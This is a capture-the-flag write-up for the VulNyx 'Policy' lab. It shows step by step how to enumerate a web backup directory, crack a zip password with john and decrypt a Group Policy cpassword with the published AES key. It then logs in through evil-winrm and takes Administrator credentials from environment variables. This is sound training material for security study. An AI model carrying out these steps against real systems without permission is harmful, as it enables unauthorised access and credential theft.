# URL
https://vulnyx.com/#policy
# Concept
* web directory backup enumeration
* Group policy backups
* cracking a Zip file's password hash
* decrypting Windows `cpassword`s
* interacting with WinRM
# Method of solve
## Starting Scans
* there are a bunch of ports open, but we need to pay attention to the following
```
80 http
445 / 139 smb
5985 winrm
```
* if we use the awesome web dirbusting tool `dirb`, we find an interesting endpoint
```
/backup
```
* from there, we can look for additional files in the `/backup` directory:
```
gobuster dir -u http://192.168.212.25/backup/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,zip,bak,json,xml,rar,config,asp,aspx
```
## Initial Access: Finding a WinRM accessible account
* we find a file called `groups.zip`, so download it
* it is password protected, so we have to crack the hash
```
zip2john groups.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```
* the password is `Zipper`
* in the zip file there's a `Group.xml` file with user information
```
username: XEROSEC
cpassword: IwLNLy0Ck5xIlXEsPMTbOF1f/NnliQFKeGv139eUEgE
```
### What is a Cpassword?
```
A “Windows C password” (or cpassword) is the encrypted password field used by Group Policy Preferences (GPP) in Active Directory to deploy local account passwords
```
* what we really need to know about Windows C passwords is that they're encrypted passwords that use a well-known AES-256 CBC encryption
* the well-known key for this cipher is `4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b`
* we can use CyberChef to decrypt the password
  * step 1: decode from base64
  * step 2: aes decrypt
    * key `4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b` in hex
    * IV `00000000000000000000000000000000` in hex
    * mode `CBC`
    * input `RAW`
    * output `RAW`
  * step 3: text encoding brute force
* the result is `G.P.P.2.k.2.6.b.l.a.h.b.l.a.h.` in UTF-8
* just remove the dots in between the characters and that's your password
* use `nxc` to confirm the user credentials
```
nxc smb 192.168.212.25 -u 'XEROSEC' -p 'GPP2k26blahblah'
nxc winrm 192.168.212.25 -u 'XEROSEC' -p 'GPP2k26blahblah'
```
* this lets us know we have terminal access as this user with the WinRM service
* we can our favorite tool, `Evil-WinRM` to get into the system:
```
evil-winrm -i 192.168.212.25 -u 'XEROSEC' -p 'GPP2k26blahblah'
```
## Privilege Escalation
* we're in, and if we look at the environment variables for the session, then we see some credentials
```
Get-ChildItem env:
```
* this password could be the Administrator's password, so we test it out with `nxc`
```
nxc smb 192.168.212.25 -u 'Administrator' -p 'GigaAdmin123!'
nxc winrm 192.168.212.25 -u 'Administrator' -p 'GigaAdmin123!'
```
* we have a working of `Administrator` credentials
* GAME OVER
